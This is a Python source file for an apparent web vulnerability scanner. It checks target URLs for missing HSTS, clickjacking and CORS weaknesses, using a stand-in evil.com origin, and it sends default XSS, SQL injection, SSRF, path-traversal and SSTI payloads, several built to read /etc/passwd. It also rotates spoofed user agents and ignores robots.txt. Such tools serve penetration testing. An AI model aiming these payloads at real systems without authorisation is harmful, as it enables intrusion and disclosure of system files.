import mechanize
from urllib import parse as urlparse
import http.cookiejar
from parametizer.params import parametizer
from scanners.scan import xss
from scanners.scan import lfi
from scanners.scan import sqli
from parametizer.core.save_it import save_output
import sys 
from urllib.request import urlopen
from urllib.error import URLError, HTTPError
import random
from scanners.scan_idor import idor
from scanners.scan_lfi import lfi
from scanners.scan_ssrf import ssrf
from scanners.scan_ssti import ssti
import random

user_agents = [
 "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
 "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
 "Mozilla/3.01 (Macintosh; PPC)",
 "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",  
 "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",  
 "Opera/8.00 (Windows NT 5.1; U; en)",  
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
]

user_agent = random.choice (user_agents)

#Stuff related to Mechanize browser module
br = mechanize.Browser() #Shortening the call by assigning it to a varaible "br"
# set cookies
cookies = http.cookiejar.LWPCookieJar()
br.set_cookiejar(cookies)
# Mechanize settings
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_debug_http(False)
br.set_debug_responses(False)
br.set_debug_redirects(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [('User-Agent', user_agent),
('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('Accept-Encoding','br')]

def all_list(l,c,cl,h,x,lf,s,i,sr,sst,output,fname,o,vulnerables_urls):   
     
 for linea in l:

     try:
         print()
         print('---------------------')
         print('\033[1;32m' + linea+ ':\033[0m')
         print('---------------------')
         print()
         if 'http://' in linea:
             pass
         elif 'https://' in linea:
             for line in linea:
                 linea = linea.replace('https://', 'http://')
         else:
             linea = 'http://' + linea
         try:
             br.open(linea, timeout=10.0) #Opens the url
         except URLError as e:
             for line in linea:
                 linea = linea.replace('http://', 'https://')
             try:    
                 br.open(linea)
             except:
                 print('[?] open Url Error')     
         #forms = br.forms() #Finds all the forms present in webpage
         
         headers = str(urlopen(linea).headers).lower()
         
         if h:
                if 'strict-transport-security' not in headers:
                    print ('\033[1;32m[+]\033[0m ' + linea + ' \033[1;32mNot force HSTS\033[0m')
                    vulnerables_urls.append('****************** VULNERABLE TO HSTS: *********************')
                    vulnerables_urls.append(linea)      
                else:
                    print ('\033[1;31m[-]\033[0m ' + linea + ' \033[1;31mHSTS is OK\033[0m')  
            
         if cl:
                if 'x-frame-options' not in headers:
                    if 'content-security-policy' not in headers:
                        print ('\033[1;32m[+]\033[0m ' + linea + ' \033[1;32mvulnerable to Clickjacking\033[0m')
                        vulnerables_urls.append('****************** VULNERABLE TO CLICKJACKING: *********************')
                        vulnerables_urls.append(linea)
                    else:
                        print ('\033[1;31m[-]\033[0m '  + linea + ' \033[1;31mis not vulnerable to Clickjacking\033[0m')
                else:
                    print ('\033[1;31m[-]\033[0m '  + linea + ' \033[1;31mis not vulnerable to Clickjacking\033[0m')
            
         if c:
                    br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
            ('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('Accept-Encoding','br'), ('Origin','https://evil.com')]

                    if 'access-control-allow-origin' in headers:
                        if 'https://evil.com' in headers:
                            print ('\033[1;32m[+]\033[0m ' + linea + ' \033[1;32mis vulnerable to Cors\033[0m')
                            vulnerables_urls.append('****************** VULNERABLE TO CORS: *********************') 
                            vulnerables_urls.append(linea)                           
                        else:
                            print ('\033[1;31m[-]\033[0m ' + linea + ' \033[1;31mis not vulnerable to Cors\033[0m')
                    else:
                     print ('\033[1;31m[-]\033[0m ' + linea + ' \033[1;31mis not vulnerable to Cors\033[0m')
     except:
         continue   
     try:    
         if x:
             uri=[]
             wordlist=['"><script>confirm(1)</script>']
             try:
                 parametizer(linea,output)
                 with open(output, "r") as f:
                     for v in f.readlines():
                         v = v.strip()
                         if v == "" or v.startswith("#"):
                             continue
                         uri.append(v)            
                 print()        
                 print('\033[1;33mTest xss for default payload:\033[0m')       
                 xss(uri,wordlist,vulnerables_urls)           
             except: 
                  continue
     except:
         continue
     try:    
         if s:
             uri=[]
             wordlist=["'"]   
             try:
                 parametizer(linea,output)
                 with open(output, "r") as f:
                     for q in f.readlines():
                         q = q.strip()
                         if q == "" or q.startswith("#"):
                             continue
                         uri.append(q)            
                 print()        
                 print('\033[1;33mTest sqli for default payload:\033[0m')
                 print()        
                 sqli(uri,wordlist,vulnerables_urls)           
             except: 
                  continue
     except:
         continue    
     try:    
         if i:
             uri=[]
             wordlist=['']   
             try:
                 parametizer(linea,output)
                 with open(output, "r") as f:
                     for j in f.readlines():
                         j = j.strip()
                         if j == "" or j.startswith("#"):
                             continue
                         uri.append(j)            
                 print()        
                 print('\033[1;33mSearch idor parameters:\033[0m')
                 print()        
                 idor(uri,wordlist,vulnerables_urls)           
             except: 
                  continue
     except:
        continue
     try:    
         if sr:
             uri=[]
             wordlist=['file:///etc/passwd','file://\/\/etc/passwd','netdoc:///etc/passwd']   
             try:
                 parametizer(linea,output)
                 with open(output, "r") as f:
                     for w in f.readlines():
                         w = w.strip()
                         if w == "" or w.startswith("#"):
                             continue
                         uri.append(w)            
                 print()        
                 print('\033[1;33mTest SSRF for default payloads:\033[0m')
                 print()        
                 ssrf(uri,wordlist,vulnerables_urls)           
             except: 
                  continue
     except:
         continue        
     try:    
         if lf:
             uri=[]
             wordlist=['../../../../../../../../../../../../../../../../../../../../../../etc/passwd']   
             try:
                 parametizer(linea,output)
                 with open(output, "r") as f:
                     for z in f.readlines():
                         z = z.strip()
                         if z == "" or z.startswith("#"):
                             continue
                         uri.append(z)            
                 print()        
                 print('\033[1;33mTest lfi for default payload:\033[0m')
                 print()        
                 lfi(uri,wordlist,vulnerables_urls)           
             except: 
                  continue
     except:
         continue
     try:    
         if sst:
             uri=[]
             wordlist=["<%= File.open('/etc/passwd').read %>","${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}"]   
             try:
                 parametizer(linea,output)
                 with open(output, "r") as f:
                     for k in f.readlines():
                         k = k.strip()
                         if k == "" or k.startswith("#"):
                             continue
                         uri.append(k)            
                 print()        
                 print('\033[1;33mTest ssti for default payloads:\033[0m')
                 print()        
                 ssti(uri,wordlist,vulnerables_urls)           
             except: 
                  continue
     except:
         continue                    
     if o:
         save_output(vulnerables_urls,fname,linea)    
         



